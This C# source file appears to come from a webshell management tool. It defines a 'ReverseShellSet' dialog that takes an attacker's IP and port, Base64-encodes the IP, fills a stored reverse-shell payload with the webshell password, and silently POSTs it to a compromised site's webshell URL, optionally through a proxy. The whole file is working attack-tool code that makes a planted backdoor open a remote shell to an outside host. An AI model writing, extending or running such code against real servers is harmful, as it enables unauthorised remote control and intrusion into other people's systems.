using C2.Controls;
using C2.Core;
using C2.Utils;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class ReverseShellSet :  StandardDialog
    {
        private readonly WebShellTaskConfig task;
        private ProxySetting proxy;
        public ReverseShellSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
        {
            InitializeComponent();
            task = taskConfig;
            this.proxy = proxy;
            rshTextBox.Text = Global.ReverseShellHost;
        }

        protected override bool OnOKButtonClick()
        {
            string rsh = rshTextBox.Text.Trim();
            if (rsh.IsNullOrEmpty())
            {
                HelpUtil.ShowMessageBox("【反弹地址】不能为空。");
                return false;
            }

            Match mc = Regex.Match(rsh, @"((\d{1,3}\.){3}\d{1,3}):(\d{1,5})");
            
            if (!mc.Success)
            {
                HelpUtil.ShowMessageBox("【反弹地址】格式有误。");
                return false;
            }
            Global.ReverseShellHost = rsh;
            string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
            string port = mc.Groups[3].Value;
            string payload = string.Format(Global.ReverseShellPayload, task.Password, port, encodeIP);
            Task<string> t = Task.Run(() => PostPayload(payload));
            return base.OnOKButtonClick();
        }


        private string PostPayload(string payload)
        {
            try
            {
                return WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 900000, proxy);
            }
            catch
            {
                return string.Empty;
            }

        }
    }
}
